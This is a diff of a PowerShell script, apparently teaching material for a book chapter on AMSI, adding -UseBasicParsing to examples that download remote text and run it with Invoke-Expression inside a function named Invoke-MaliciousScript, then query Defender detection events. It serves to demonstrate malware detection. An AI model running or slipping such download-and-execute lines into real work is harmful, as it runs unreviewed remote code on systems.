@@ -58,12 +58,12 @@ Invoke-MaliciousScript
 
 # Example 5
 Function Invoke-MaliciousScript {
-    $output = Invoke-WebRequest https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter12/AMSIExample5.txt
+    $output = Invoke-WebRequest -UseBasicParsing https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter12/AMSIExample5.txt
     Invoke-Expression $output
 }
 Invoke-MaliciousScript
 
 # Example 6
-Invoke-Expression (Invoke-WebRequest https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter12/AMSIExample6.txt)
+Invoke-Expression (Invoke-WebRequest -UseBasicParsing https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter12/AMSIExample6.txt)
 
 Get-WinEvent 'Microsoft-Windows-Windows Defender/Operational' | Where-Object Id -eq 1116 | Format-List
